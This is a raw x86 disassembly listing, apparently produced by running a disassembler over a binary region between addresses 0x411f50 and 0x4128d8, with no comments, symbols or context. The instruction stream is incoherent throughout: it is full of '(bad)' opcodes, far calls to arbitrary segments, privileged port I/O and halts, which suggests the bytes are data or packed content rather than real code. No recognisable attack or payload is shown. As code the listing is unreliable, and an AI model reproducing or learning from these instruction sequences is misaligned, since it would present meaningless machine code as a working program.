  411f50:	adc    edi,esp
  411f52:	test   ah,dl
  411f54:	jnp    0x411f8c
  411f56:	(bad)  
  411f57:	je     0x411f1e
  411f59:	cmp    edx,esp
  411f5b:	dec    eax
  411f5c:	sbb    esi,DWORD PTR [edx+0x7]
  411f5f:	cmp    BYTE PTR [ebx-0x14],al
  411f62:	test   BYTE PTR [ecx+0x55],ch
  411f65:	faddp  st(2),st
  411f67:	retf   
  411f68:	dec    esi
  411f69:	call   0xf0cb:0x74859370
  411f70:	pop    eax
  411f71:	lahf   
  411f72:	xchg   ebp,eax
  411f73:	jmp    0x411f91
  411f75:	jns    0x411f06
  411f77:	sbb    DWORD PTR [ebp+0x47],0x3f
  411f7b:	push   ebx
  411f7c:	daa    
  411f7d:	ins    BYTE PTR es:[edi],dx
  411f7e:	jge    0x411f99
  411f80:	stos   BYTE PTR es:[edi],al
  411f81:	push   ds
  411f82:	lock and esi,DWORD PTR [ebx+0x3e79415c]
  411f89:	xchg   ebp,eax
  411f8a:	push   ebx
  411f8b:	loope  0x411fc7
  411f8d:	xchg   esp,eax
  411f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f8f:	loope  0x411fad
  411f91:	fst    QWORD PTR [esi-0x74616bbb]
  411f97:	sub    al,0x1e
  411f99:	loop   0x411fc0
  411f9b:	out    0x4d,eax
  411f9d:	add    al,0x3f
  411f9f:	out    0x11,eax
  411fa1:	or     ah,BYTE PTR [ebp*1+0x572a7e54]
  411fa8:	outs   dx,DWORD PTR ds:[esi]
  411fa9:	sub    eax,0x45301ea9
  411fae:	call   0x599:0x28399fd1
  411fb5:	nop
  411fb6:	dec    edi
  411fb7:	lods   eax,DWORD PTR ds:[esi]
  411fb8:	nop
  411fb9:	fwait
  411fba:	or     eax,0x1c5488a6
  411fbf:	mov    ds,eax
  411fc1:	mov    eax,ds:0xe885e338
  411fc6:	mov    BYTE PTR [eax-0x58],cl
  411fc9:	es stc 
  411fcb:	hlt    
  411fcc:	mov    ch,0x3b
  411fce:	ins    BYTE PTR es:[edi],dx
  411fcf:	popa   
  411fd0:	lea    esp,[ebp-0x7cdc7a5e]
  411fd6:	or     eax,0x2121d10c
  411fdb:	fcomp  DWORD PTR [edi]
  411fdd:	xor    DWORD PTR [ecx],ebp
  411fdf:	stc    
  411fe0:	in     al,dx
  411fe1:	pop    es
  411fe2:	adc    esp,DWORD PTR [ebp+eax*4-0x58431b28]
  411fe9:	inc    ebx
  411fea:	ficomp WORD PTR [edx-0x30]
  411fed:	fsubr  DWORD PTR [edi+ecx*4+0x855752c]
  411ff4:	test   dl,al
  411ff6:	push   ecx
  411ff7:	mov    dh,0x6c
  411ff9:	scas   eax,DWORD PTR es:[edi]
  411ffa:	xor    BYTE PTR [ecx+ebx*2-0x1405a8ac],ah
  412001:	jne    0x41205d
  412003:	and    eax,0x9ac777b1
  412008:	xor    cl,BYTE PTR [esi-0x74f67595]
  41200e:	pop    ebx
  41200f:	add    eax,0x5a6c4b2c
  412014:	(bad)  
  412015:	dec    esi
  412016:	lods   al,BYTE PTR ds:[esi]
  412017:	jb     0x41208c
  412019:	es repz push ecx
  41201c:	inc    edi
  41201d:	add    bl,bh
  41201f:	sbb    ecx,ecx
  412021:	ror    BYTE PTR [ecx],1
  412023:	push   ebp
  412024:	call   0x57ba:0x63076b90
  41202b:	ficomp DWORD PTR [ecx]
  41202d:	sbb    cl,ch
  41202f:	mov    al,bl
  412031:	loope  0x412014
  412033:	rcr    DWORD PTR [edi],0xd9
  412036:	mov    ebp,0x4a07046c
  41203b:	dec    ebx
  41203c:	hlt    
  41203d:	add    eax,0x54217dd4
  412042:	xchg   edx,eax
  412043:	xchg   edx,eax
  412044:	retf   0x37b9
  412047:	mov    eax,ds:0x7efc2537
  41204c:	addr16 int3 
  41204e:	or     DWORD PTR [edx-0x24],ebx
  412051:	inc    ebx
  412052:	mov    ah,0x10
  412054:	pop    esi
  412055:	aad    0x90
  412057:	xchg   ecx,eax
  412058:	push   ecx
  412059:	mov    ebx,0x51cd7ad9
  41205e:	adc    bh,cl
  412060:	loopne 0x4120d6
  412062:	dec    ecx
  412063:	aam    0x0
  412065:	adc    bh,BYTE PTR [ebx-0x31d2888]
  41206b:	pmuludq mm0,QWORD PTR ds:0x7ec1f3d2
  412072:	shl    BYTE PTR [ecx-0x5e],1
  412075:	pushf  
  412076:	in     al,dx
  412077:	cmp    al,0x28
  412079:	jns    0x4120be
  41207b:	loop   0x412047
  41207d:	xchg   BYTE PTR [ecx],bh
  41207f:	sbb    DWORD PTR [bp+0x3895],0x21
  412085:	mov    ebx,0xfbf5fd16
  41208a:	inc    edx
  41208b:	clc    
  41208c:	icebp  
  41208d:	(bad)  
  41208e:	jmp    0xe632:0xe58ca144
  412095:	loope  0x4120ed
  412097:	clc    
  412098:	dec    esp
  412099:	repz in al,0x8
  41209c:	(bad)  
  41209d:	(bad)  
  41209e:	repz icebp 
  4120a0:	inc    ebx
  4120a1:	adc    bh,bl
  4120a3:	xor    al,0x29
  4120a5:	push   ebp
  4120a6:	in     al,dx
  4120a7:	xchg   ecx,ecx
  4120a9:	dec    edi
  4120aa:	nop
  4120ab:	add    BYTE PTR [ebp+0x657b667c],ah
  4120b1:	sti    
  4120b2:	sbb    BYTE PTR [ebp-0x60e75e0e],0x7
  4120b9:	jle    0x412042
  4120bb:	adc    al,0xeb
  4120bd:	jle    0x41206f
  4120bf:	mov    edi,0x95b06c36
  4120c4:	mov    cl,0x1d
  4120c6:	les    ebp,FWORD PTR ds:0xb0a26ffe
  4120cc:	push   ebx
  4120cd:	div    BYTE PTR [ecx-0xe]
  4120d0:	ins    BYTE PTR es:[edi],dx
  4120d1:	add    dl,BYTE PTR [ebx-0x76f8729a]
  4120d7:	scas   al,BYTE PTR es:[edi]
  4120d8:	sbb    al,0x1b
  4120da:	pop    ebp
  4120db:	popa   
  4120dc:	dec    ebx
  4120dd:	xchg   edx,eax
  4120de:	mov    bl,0x78
  4120e0:	sti    
  4120e1:	mov    ch,0x5d
  4120e3:	pusha  
  4120e4:	cmp    bh,ch
  4120e6:	mov    al,0x3c
  4120e8:	dec    ecx
  4120e9:	faddp  st(0),st
  4120eb:	xor    dh,BYTE PTR [edx+eiz*8]
  4120ee:	(bad)  
  4120f0:	lahf   
  4120f1:	enter  0x8dc5,0x1
  4120f5:	pop    ds
  4120f6:	inc    ecx
  4120f7:	adc    al,0x67
  4120f9:	jae    0x412085
  4120fb:	jg     0x4120b3
  4120fd:	jp     0x41217c
  4120ff:	pop    edi
  412100:	dec    edx
  412101:	test   DWORD PTR [edx+0x50],ebx
  412104:	mov    ah,0x3d
  412106:	cmp    eax,0xe68610b1
  41210b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41210c:	jmp    0x1e9558fa
  412111:	mov    cl,0xc7
  412113:	fst    QWORD PTR [ecx-0x5abf2481]
  412119:	add    bl,cl
  41211b:	leave  
  41211c:	push   esi
  41211d:	rcr    cl,1
  41211f:	add    ch,BYTE PTR [eax+ebx*1]
  412122:	mov    WORD PTR [eax+esi*2-0x64cc863a],gs
  412129:	jne    0x41216b
  41212b:	pop    ebp
  41212c:	inc    ebx
  41212d:	push   es
  41212e:	sahf   
  41212f:	cmp    al,0x19
  412131:	mov    eax,ds:0x43cae6e4
  412136:	int    0xe8
  412138:	jne    0x4121b1
  41213a:	ret    0x9447
  41213d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41213e:	mov    esi,0xb3cebb2c
  412143:	sbb    DWORD PTR [esi+0xa],eax
  412146:	mov    ch,cl
  412148:	fadd   DWORD PTR [esi-0x1d]
  41214b:	(bad)  
  41214c:	mov    ebp,0xe1d40cd5
  412151:	test   ebx,esp
  412153:	adc    DWORD PTR [ebp-0x5c55c55b],ebp
  412159:	int3   
  41215a:	dec    edx
  41215b:	dec    ecx
  41215c:	mov    edx,0x13bf1b65
  412161:	push   ecx
  412162:	push   es
  412163:	fld    QWORD PTR [esi+0x5e850304]
  412169:	out    dx,eax
  41216a:	push   0xfffffffd
  41216c:	scas   al,BYTE PTR es:[edi]
  41216d:	and    bh,BYTE PTR [ecx-0x58da770d]
  412173:	adc    DWORD PTR ds:0x53e11f5c,esp
  412179:	adc    esi,DWORD PTR ds:0xf9b38bc5
  41217f:	jbe    0x4121d9
  412181:	xchg   esi,eax
  412182:	clc    
  412183:	jecxz  0x412123
  412185:	mov    al,ds:0x34b68160
  41218a:	stos   BYTE PTR es:[edi],al
  41218b:	(bad)  
  41218c:	icebp  
  41218d:	xchg   edx,eax
  41218e:	add    edx,DWORD PTR [esi-0x31]
  412191:	jl     0x41220e
  412193:	clc    
  412194:	stos   BYTE PTR es:[edi],al
  412195:	cmp    BYTE PTR [eax],0xe4
  412198:	lahf   
  412199:	dec    ecx
  41219a:	jge    0x4121bb
  41219c:	out    0x75,eax
  41219e:	leave  
  41219f:	fdivp  st(1),st
  4121a1:	scas   al,BYTE PTR es:[edi]
  4121a2:	xchg   BYTE PTR [ecx],dl
  4121a4:	cmc    
  4121a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121a6:	jnp    0x4121fe
  4121a8:	pop    eax
  4121a9:	jmp    0x988a:0x449d85c5
  4121b0:	mov    ecx,0x7929a498
  4121b5:	test   BYTE PTR [esi-0x65b481de],ah
  4121bb:	bound  ebx,QWORD PTR [ebp+0x363ae410]
  4121c1:	jae    0x412155
  4121c3:	xor    DWORD PTR [eax],0x31
  4121c6:	adc    eax,0xd9dd761e
  4121cb:	mov    fs,WORD PTR [ebx]
  4121cd:	pop    es
  4121ce:	adc    esp,DWORD PTR [esi+ecx*8]
  4121d1:	cmp    al,0xf7
  4121d3:	dec    ebx
  4121d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121d5:	lahf   
  4121d6:	add    DWORD PTR [edx-0x21],edx
  4121d9:	arpl   WORD PTR [esi+ebx*8+0x65],di
  4121dd:	sbb    sp,WORD PTR [esi]
  4121e0:	dec    esi
  4121e1:	add    DWORD PTR [ebp-0x4a],esp
  4121e4:	sub    BYTE PTR [edi+0x33],ch
  4121e7:	sti    
  4121e8:	adc    eax,0x2d504f18
  4121ed:	call   0x9387e413
  4121f2:	inc    esi
  4121f3:	imul   DWORD PTR ds:0x577c7418
  4121f9:	xchg   edi,eax
  4121fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121fc:	pop    esi
  4121fd:	add    al,0x8b
  4121ff:	dec    esp
  412200:	mov    ss,WORD PTR [eax-0x4f]
  412203:	mov    esi,ds
  412205:	stos   BYTE PTR es:[edi],al
  412206:	leave  
  412207:	xchg   edx,eax
  412208:	pop    eax
  412209:	fmulp  st(5),st
  41220b:	aam    0xf0
  41220d:	xchg   edx,eax
  41220e:	push   ecx
  41220f:	xor    al,0x20
  412211:	sbb    eax,DWORD PTR [esi-0x1e]
  412214:	call   0xadae:0xe5e790d
  41221b:	(bad)  
  41221c:	pop    edi
  41221d:	dec    DWORD PTR [ebx-0x6cdfac78]
  412223:	fs sbb al,0x27
  412226:	int    0x6c
  412228:	in     eax,0xb2
  41222a:	inc    ebx
  41222b:	aam    0xe6
  41222d:	push   ds
  41222e:	fnstcw WORD PTR [esi]
  412230:	(bad)  
  412231:	outs   dx,BYTE PTR ds:[esi]
  412232:	enter  0xf422,0x25
  412236:	mov    ah,0x6b
  412238:	lds    ebp,FWORD PTR ds:0xbc78f4b7
  41223e:	je     0x412294
  412240:	and    eax,0x2ef54a79
  412245:	cmp    eax,0x4de4394b
  41224a:	xor    esp,DWORD PTR [edi-0x20f69f68]
  412250:	aas    
  412251:	sbb    al,BYTE PTR [edi-0x40]
  412254:	mov    bl,0x16
  412257:	mov    ch,0x36
  412259:	jge    0x4122d0
  41225b:	(bad)  
  41225c:	pusha  
  41225d:	(bad)  
  41225e:	and    eax,esi
  412260:	push   0x73
  412262:	sub    edi,DWORD PTR [edi-0x69]
  412265:	test   DWORD PTR [edx+0x21],esi
  412268:	inc    edx
  412269:	cld    
  41226a:	nop
  41226b:	scas   eax,DWORD PTR es:[edi]
  41226c:	loope  0x41229c
  41226e:	sub    BYTE PTR [ebp-0x70],dh
  412271:	imul   ebx,esi,0xe8b031
  412277:	add    bl,BYTE PTR [ebx]
  412279:	inc    edi
  41227a:	int    0xaa
  41227c:	mov    ds,WORD PTR [ebp+eax*4-0xd54fe7b]
  412283:	push   ecx
  412284:	call   0x233ec58b
  412289:	xchg   ebx,eax
  41228a:	and    DWORD PTR [ebp+0x5933dab6],eax
  412290:	pop    ebp
  412291:	or     ebx,ebp
  412293:	arpl   WORD PTR [ebx-0x26],sp
  412296:	jmp    DWORD PTR [edx]
  412298:	cmp    dl,BYTE PTR [esi]
  41229a:	jl     0x412231
  41229c:	sbb    eax,0xa56f865
  4122a1:	mov    edi,0x3950eec6
  4122a6:	cmc    
  4122a7:	call   0x3a5e6937
  4122ac:	call   0x3eef:0x6c9402b3
  4122b3:	sbb    eax,0x4919a76b
  4122b8:	ffreep st(4)
  4122ba:	inc    eax
  4122bb:	ror    WORD PTR [ebp-0x6c976bcb],cl
  4122c2:	jno    0x41230c
  4122c4:	cmp    al,0x55
  4122c6:	mov    ecx,0x7fd044ef
  4122cb:	mov    dl,0x8d
  4122cd:	shl    BYTE PTR [eax-0x30],cl
  4122d0:	mul    BYTE PTR [bp+di-0x8]
  4122d4:	cmp    al,bh
  4122d6:	mov    al,ds:0x53969e50
  4122db:	pushf  
  4122dc:	out    0x9b,al
  4122de:	es out dx,al
  4122e0:	sub    DWORD PTR [edi],ecx
  4122e2:	xchg   BYTE PTR [ebx-0x57],dh
  4122e5:	sbb    dl,cl
  4122e7:	pop    ss
  4122e8:	add    eax,0x886326a9
  4122ed:	pop    ss
  4122ee:	(bad)  
  4122ef:	std    
  4122f0:	aam    0x1b
  4122f2:	sub    al,0xf6
  4122f4:	xor    DWORD PTR [eax-0x144304a9],0xffffffe9
  4122fb:	adc    BYTE PTR [ebx-0x4b],cl
  4122fe:	ret    0x9e48
  412301:	call   0x3af42eac
  412306:	or     edi,DWORD PTR [ebx+0x56]
  412309:	and    BYTE PTR [edx+ebp*8],cl
  41230c:	pushf  
  41230d:	add    DWORD PTR [edi+0x5],eax
  412310:	lods   al,BYTE PTR ds:[esi]
  412311:	sbb    eax,0x360c8cf2
  412316:	mov    ah,0xa7
  412318:	sbb    ebp,DWORD PTR [eax+ebx*1]
  41231b:	icebp  
  41231c:	adc    al,0xf3
  41231e:	in     eax,dx
  41231f:	mov    ebx,0xe2a38931
  412324:	inc    eax
  412325:	(bad)  [ebp+edi*1-0x5d3da3e]
  41232c:	xor    BYTE PTR [eax],dl
  41232e:	pop    esp
  41232f:	jbe    0x412343
  412331:	push   edx
  412332:	push   ebx
  412333:	mov    ds:0x6afe94f,al
  412338:	and    BYTE PTR [edi],al
  41233a:	rol    BYTE PTR [esi-0x3d],1
  41233d:	sub    al,0x51
  41233f:	cli    
  412340:	mov    ecx,0x5a309deb
  412345:	adc    DWORD PTR [esi],esp
  412347:	sti    
  412348:	push   cs
  412349:	jl     0x4122e0
  41234b:	adc    DWORD PTR [esi+ebp*1-0xb],0x50
  412350:	repz inc ecx
  412352:	and    BYTE PTR [edi+0x1],0xcb
  412356:	in     al,dx
  412357:	cmp    al,0xb1
  412359:	popa   
  41235a:	hlt    
  41235b:	jno    0x412303
  41235d:	in     al,0x96
  41235f:	test   BYTE PTR [ecx],ch
  412361:	pop    esi
  412362:	frstor [edi-0x70]
  412365:	or     edx,DWORD PTR [edx]
  412367:	and    DWORD PTR [edi],eax
  412369:	adc    DWORD PTR [esi-0x1db8f2a0],edi
  41236f:	fxch   st(0)
  412371:	loopne 0x4123dd
  412373:	mov    cl,0x23
  412375:	xchg   ecx,eax
  412376:	ja     0x412376
  412378:	jo     0x4123c1
  41237a:	les    esp,FWORD PTR [eax-0x5c]
  41237d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41237f:	xchg   eax,ebx
  412381:	mov    eax,ds:0xfde35181
  412386:	dec    ecx
  412387:	dec    ebp
  412388:	or     ch,BYTE PTR [edi-0x2e]
  41238b:	mov    DWORD PTR [ecx+eiz*1+0x78],0x88e55f38
  412393:	inc    eax
  412394:	out    dx,al
  412395:	test   eax,0x5f5fede7
  41239a:	adc    ch,BYTE PTR [edi-0x1ec37365]
  4123a0:	sub    al,0x41
  4123a2:	and    BYTE PTR [ebx],ch
  4123a4:	inc    edx
  4123a5:	add    ebp,DWORD PTR [ecx-0x27]
  4123a8:	leave  
  4123a9:	xchg   ecx,eax
  4123aa:	xlat   BYTE PTR ds:[ebx]
  4123ab:	sbb    BYTE PTR [ecx+0x57a3e3db],dl
  4123b1:	fisub  WORD PTR [eax-0x26]
  4123b4:	sub    BYTE PTR [edi+ebp*8+0x56c7cae2],dl
  4123bb:	push   0x1d83db53
  4123c0:	xchg   ebx,eax
  4123c1:	inc    ecx
  4123c2:	jae    0x412345
  4123c4:	js     0x4123ee
  4123c6:	or     DWORD PTR [ecx],edx
  4123c8:	push   esi
  4123c9:	hlt    
  4123ca:	and    edi,0x13679d9b
  4123d0:	xor    esi,DWORD PTR [ecx]
  4123d2:	add    al,0xbd
  4123d4:	jl     0x4123ca
  4123d6:	xlat   BYTE PTR ds:[ebx]
  4123d7:	mov    al,0xf4
  4123d9:	mov    al,0xa3
  4123db:	test   ecx,edi
  4123dd:	lds    edx,FWORD PTR [ebx]
  4123df:	xchg   ecx,eax
  4123e0:	fnstenv [ecx-0x47366e07]
  4123e6:	(bad)  
  4123e7:	repz das 
  4123e9:	test   DWORD PTR [esi+0x7],esi
  4123ec:	scas   al,BYTE PTR es:[edi]
  4123ed:	hlt    
  4123ee:	xchg   ecx,eax
  4123ef:	lahf   
  4123f0:	ins    DWORD PTR es:[edi],dx
  4123f1:	cmc    
  4123f2:	push   ss
  4123f3:	cld    
  4123f4:	data16 std 
  4123f6:	jbe    0x412455
  4123f8:	(bad)  
  4123f9:	(bad)  
  4123fb:	add    eax,edx
  4123fd:	pop    edx
  4123fe:	mov    eax,0xff3ae198
  412403:	push   ebx
  412404:	or     al,0xa5
  412406:	gs mov ch,0x7b
  412409:	mov    bh,0x9b
  41240b:	xchg   edx,eax
  41240d:	mov    ebp,0xd78d9a29
	...
  4125e6:	sbb    al,0x6c
  4125e8:	ins    DWORD PTR es:[edi],dx
  4125e9:	les    edi,FWORD PTR [ebp-0x3b]
  4125ec:	mov    ebp,0x7e8bcdfc
  4125f1:	jae    0x41265f
  4125f3:	sbb    bl,BYTE PTR gs:[edi]
  4125f6:	cmp    edi,DWORD PTR [esi]
  4125f8:	add    DWORD PTR [eax],eax
  4125fa:	and    al,BYTE PTR [edi]
  4125fc:	add    BYTE PTR [eax],al
  4125fe:	pop    ss
  4125ff:	inc    esp
  412600:	enter  0x194,0xe8
  412604:	std    
  412605:	pop    edi
  412606:	std    
  412607:	pop    ss
  412608:	jge    0x412663
  41260a:	fcompp 
  41260c:	sub    bl,ah
  41260e:	(bad)
  412611:	or     DWORD PTR [eax-0x17cd6108],esi
  412617:	int3   
  412618:	sahf   
  412619:	lods   eax,DWORD PTR ds:[esi]
  41261a:	popa   
  41261b:	stos   BYTE PTR es:[edi],al
  41261c:	sbb    bh,BYTE PTR [ecx-0x68]
  41261f:	sbb    eax,0x9eb148a6
  412624:	xor    ah,al
  412626:	adc    edi,ebp
  412628:	dec    eax
  412629:	add    DWORD PTR [eax],eax
  41262b:	lea    ebp,[edi+0x5]
  41262e:	push   es
  41262f:	push   cs
  412630:	stos   DWORD PTR es:[edi],eax
  412631:	int3   
  412632:	leave  
  412633:	addr16 xchg ax,ax
  412636:	aam    0x7c
  412638:	test   eax,0xbdc4732c
  41263d:	inc    edi
  41263e:	xchg   BYTE PTR [edi],dh
  412640:	ins    BYTE PTR es:[edi],dx
  412641:	rcr    DWORD PTR [esi],cl
  412643:	push   ebp
  412644:	mov    ebp,0xf347589
  412649:	rol    ebp,cl
  41264b:	or     esi,DWORD PTR [esi]
  41264d:	les    ebx,FWORD PTR [eax+0x2f]
  412650:	pop    ebx
  412651:	pop    es
  412652:	mov    esp,0x38667090
  412657:	sub    DWORD PTR [ebp+0x60256a94],ecx
  41265d:	scas   eax,DWORD PTR es:[edi]
  41265e:	fs pop ss
  412660:	fild   QWORD PTR [edi+0x7f51fbb2]
  412666:	mov    al,ds:0x225a0914
  41266b:	and    BYTE PTR [edx],al
  41266d:	scas   eax,DWORD PTR es:[edi]
  41266e:	pop    ebx
  41266f:	push   edi
  412670:	push   ecx
  412671:	cs adc eax,0x643d9f74
  412677:	ins    DWORD PTR es:[edi],dx
  412678:	mov    esp,0xd82893a7
  41267d:	(bad)  
  41267e:	push   edi
  41267f:	in     al,dx
  412680:	adc    DWORD PTR ds:0xf12212df,ebp
  412686:	jo     0x4126da
  412688:	pop    es
  412689:	xor    al,0x18
  41268b:	leave  
  41268c:	mov    cl,0xf9
  41268e:	xchg   ecx,eax
  41268f:	fist   WORD PTR [ebx-0x4ba4f44c]
  412695:	int3   
  412696:	jbe    0x412715
  412698:	sub    DWORD PTR [ecx+0x1387c163],ebx
  41269e:	scas   eax,DWORD PTR es:[edi]
  41269f:	inc    esi
  4126a0:	outs   dx,DWORD PTR ds:[esi]
  4126a1:	lea    ebx,[eax]
  4126a3:	outs   dx,BYTE PTR gs:[esi]
  4126a5:	fucomi st,st(1)
  4126a7:	dec    dh
  4126a9:	cmp    edx,DWORD PTR [eax]
  4126ab:	or     esp,DWORD PTR [ecx+0x680a8501]
  4126b1:	jnp    0x41263a
  4126b3:	popf   
  4126b4:	jecxz  0x4126c8
  4126b6:	fsub   st,st(4)
  4126b8:	add    bl,BYTE PTR [edx]
  4126ba:	inc    ebp
  4126bb:	test   eax,0x2511c3bc
  4126c0:	stc    
  4126c1:	rcr    BYTE PTR [edi-0x44798035],cl
  4126c7:	mov    esi,0xf16e7e30
  4126cc:	sbb    esp,DWORD PTR [edx-0x5eb6564]
  4126d2:	cmp    eax,0xf71f26b
  4126d7:	xchg   edx,eax
  4126d8:	adc    BYTE PTR [eax+0x58],cl
  4126db:	mov    ebx,DWORD PTR [esi]
  4126dd:	aaa    
  4126de:	enter  0xa3f5,0x8f
  4126e2:	retf   0x737a
  4126e5:	test   eax,0xd735fde0
  4126ea:	and    edx,DWORD PTR [ecx+ebp*1+0xf]
  4126ee:	sbb    dl,BYTE PTR [ecx-0x34]
  4126f1:	stc    
  4126f2:	js     0x412726
  4126f4:	loop   0x41267b
  4126f6:	retf   0x20d7
  4126f9:	lods   al,BYTE PTR ds:[esi]
  4126fa:	in     eax,dx
  4126fb:	fist   DWORD PTR [edx+0x23]
  4126fe:	ss xchg esi,eax
  412700:	pop    edi
  412701:	xchg   ebx,eax
  412702:	les    ebp,FWORD PTR [ecx]
  412704:	jle    0x412713
  412706:	cwde   
  412707:	jae    0x412743
  412709:	test   BYTE PTR [ebp-0x6e],0x51
  41270d:	push   edi
  41270e:	push   ecx
  41270f:	mov    DWORD PTR gs:[ecx+0x2fbdda2e],0xb258d00e
  41271a:	adc    eax,DWORD PTR [edx-0x51]
  41271d:	jmp    0x2b269818
  412722:	ds xchg ebx,eax
  412724:	stc    
  412725:	ror    edx,1
  412727:	scas   al,BYTE PTR es:[edi]
  412728:	xchg   ebp,eax
  412729:	mov    esp,0x2cf65a8c
  41272e:	scas   eax,DWORD PTR es:[edi]
  41272f:	pop    ebp
  412730:	ins    BYTE PTR es:[edi],dx
  412731:	mov    cl,0x12
  412733:	mul    BYTE PTR [edx-0x1b]
  412736:	xchg   DWORD PTR [edi],ebp
  412738:	outs   dx,DWORD PTR ds:[esi]
  412739:	ds jg  0x412737
  41273c:	fnstenv ds:0x283f27a6
  412742:	fld    QWORD PTR [edx+0x1e]
  412745:	ja     0x4126ec
  412747:	ja     0x412719
  412749:	stos   BYTE PTR es:[edi],al
  41274a:	sub    al,0xe2
  41274c:	sub    eax,ecx
  41274e:	inc    ebp
  41274f:	push   ds
  412750:	pop    eax
  412751:	jns    0x412742
  412753:	push   ds
  412754:	js     0x412786
  412756:	adc    BYTE PTR [ebx+0x232f84e4],ah
  41275c:	ret    0x2edd
  41275f:	ins    DWORD PTR es:[edi],dx
  412760:	sbb    ecx,DWORD PTR [edx+0x2c]
  412763:	xchg   edx,eax
  412764:	xchg   ebx,eax
  412765:	cs hlt 
  412767:	mov    al,dh
  412769:	or     ch,BYTE PTR [ebp-0x21799885]
  41276f:	jns    0x412719
  412771:	xor    dh,BYTE PTR [edx-0x2d]
  412774:	xor    DWORD PTR [edi],esi
  412776:	pop    ebx
  412777:	dec    edi
  412778:	or     al,0xb1
  41277a:	inc    ecx
  41277b:	mov    dl,0x50
  41277d:	rcr    BYTE PTR [eax+esi*2+0x550d429f],0xb4
  412785:	jge    0x41278a
  412787:	jp     0x4127cf
  412789:	xchg   ebp,eax
  41278a:	mov    bl,0x8d
  41278c:	test   BYTE PTR [edi],ch
  41278e:	stc    
  41278f:	xchg   edi,eax
  412790:	jmp    0x4127fc
  412792:	cmp    DWORD PTR [ebp+0x51731626],ebx
  412798:	addr16 nop
  41279a:	xor    eax,0x97a39426
  41279f:	cmp    DWORD PTR [ebx-0x4d],esi
  4127a2:	inc    eax
  4127a3:	sub    eax,0x3cb147b2
  4127a8:	sub    eax,0x1adf4e23
  4127ad:	or     ebp,eax
  4127af:	add    eax,0x81d6f7ae
  4127b4:	jp     0x4127a0
  4127b6:	jmp    0x5f12d7c1
  4127bb:	dec    edx
  4127bc:	mov    WORD PTR [esp+esi*4],?
  4127bf:	sar    BYTE PTR [esp+ebx*8+0x78],0x3c
  4127c4:	pop    ecx
  4127c5:	pop    edx
  4127c6:	cmc    
  4127c7:	push   0xffffffe0
  4127c9:	lea    esp,[edx-0xc2326c4]
  4127cf:	mov    ebp,0x42ec8d28
  4127d4:	(bad)  
  4127d6:	jecxz  0x41282a
  4127d8:	and    eax,0x728fdaed
  4127dd:	aaa    
  4127de:	mov    ebp,0x36eb200b
  4127e3:	(bad)  
  4127e4:	fisubr WORD PTR [edi-0xc]
  4127e7:	xchg   BYTE PTR [edi-0x31],ah
  4127ea:	ins    BYTE PTR es:[edi],dx
  4127eb:	in     al,dx
  4127ec:	ret    
  4127ed:	mov    eax,0xdad1d533
  4127f2:	jl     0x412803
  4127f4:	pop    edi
  4127f5:	mov    ds:0xa7049a0f,al
  4127fa:	jb     0x412868
  4127fc:	pop    ebx
  4127fd:	icebp  
  4127fe:	lods   eax,DWORD PTR ds:[esi]
  4127ff:	mov    ds:0xa8009873,eax
  412804:	xor    eax,0x6eecb56a
  412809:	add    edi,0xffffffd2
  41280c:	and    esi,DWORD PTR [ebx]
  41280e:	cwde   
  41280f:	iret   
  412810:	xor    BYTE PTR [edi],bh
  412812:	sub    al,0x60
  412814:	mov    ecx,0xccd7a0e1
  412819:	pop    esi
  41281a:	push   edi
  41281b:	add    BYTE PTR [eax-0x559bb9f6],ah
  412821:	jle    0x4127b1
  412823:	(bad)  
  412824:	or     dh,BYTE PTR ss:[edx-0x27]
  412828:	sbb    eax,0x7579d111
  41282d:	mov    edx,0xcb3458e8
  412832:	ret    0xf49d
  412835:	cli    
  412836:	mov    BYTE PTR [eax-0x5a7f2d0],dl
  41283c:	cmp    edx,DWORD PTR ds:0x8311c53f
  412842:	ins    BYTE PTR es:[edi],dx
  412843:	mov    cl,0xa4
  412845:	cld    
  412846:	cld    
  412847:	or     BYTE PTR [edx-0x31],0xbc
  41284b:	cmp    BYTE PTR [ebx-0x47],al
  41284e:	lods   al,BYTE PTR ds:[esi]
  41284f:	call   0x8331f888
  412854:	push   ds
  412855:	stc    
  412856:	pop    edx
  412857:	int    0x15
  412859:	add    bh,bh
  41285b:	lds    ebp,FWORD PTR [ecx+0x11]
  41285e:	sbb    al,0xc3
  412860:	or     eax,0x85843b00
  412865:	dec    ebp
  412866:	sbb    DWORD PTR [edx+0x31],edi
  412869:	(bad)  
  41286a:	pop    edi
  41286b:	sub    BYTE PTR [esi+0x49319e2c],al
  412871:	fst    st(4)
  412873:	pushf  
  412874:	jne    0x412883
  412876:	inc    ecx
  412877:	ret    
  412878:	(bad)  
  412879:	bnd jge 0x4128a0
  41287c:	repz loopne 0x4128ab
  41287f:	ror    DWORD PTR [ebx+0x5f],0xff
  412883:	sub    esp,DWORD PTR [ecx-0x521c6427]
  412889:	clc    
  41288a:	or     dl,bl
  41288c:	mov    DWORD PTR [ecx-0x53],edx
  41288f:	jmp    0x3a82:0x445eefc8
  412896:	clc    
  412897:	and    BYTE PTR [edx-0x2ee28847],cl
  41289d:	into   
  41289e:	add    DWORD PTR [ebx+eiz*2+0x265ed3d6],ecx
  4128a5:	sti    
  4128a6:	je     0x412830
  4128a8:	pop    ecx
  4128a9:	nop
  4128aa:	sar    DWORD PTR [esi],cl
  4128ac:	inc    ebx
  4128ad:	fstp   DWORD PTR [edx-0x6669ec0d]
  4128b3:	cwde   
  4128b4:	repz or al,0xf
  4128b7:	xchg   esi,eax
  4128b8:	jb     0x412881
  4128ba:	test   DWORD PTR [edi+eiz*2+0x43],eax
  4128be:	sub    BYTE PTR [eax+0x67],cl
  4128c1:	xchg   ecx,eax
  4128c2:	push   eax
  4128c3:	rcl    DWORD PTR [edx+0x5a497db8],cl
  4128c9:	inc    esi
  4128ca:	xchg   ebx,eax
  4128cb:	pop    ebx
  4128cc:	loope  0x41289a
  4128ce:	test   DWORD PTR [ecx],eax
  4128d0:	(bad)  
  4128d1:	fcomip st,st(2)
  4128d3:	mov    esi,0x87d002c1
  4128d8:	or     edx,DWORD PTR [esi+0x7588640e]
